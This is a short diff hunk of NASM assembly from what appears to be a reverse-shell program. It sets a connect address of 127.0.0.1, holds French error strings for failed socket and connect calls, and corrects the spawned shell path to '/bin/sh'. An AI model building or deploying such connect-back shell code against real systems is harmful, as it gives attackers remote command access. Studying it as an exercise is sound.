@@ -16,7 +16,7 @@ segment .rodata
 			at sin_addr, dd 0x0100007f	; IP in little endian
 		iend
 
-		binsh db "/bin/sh_foorbar", 0
+		binsh db "/bin/sh", 0
 
 	error_socket  db "[X] Error: socket échoué", 10
 	error_connect db "[X] Error: connect échoué", 10
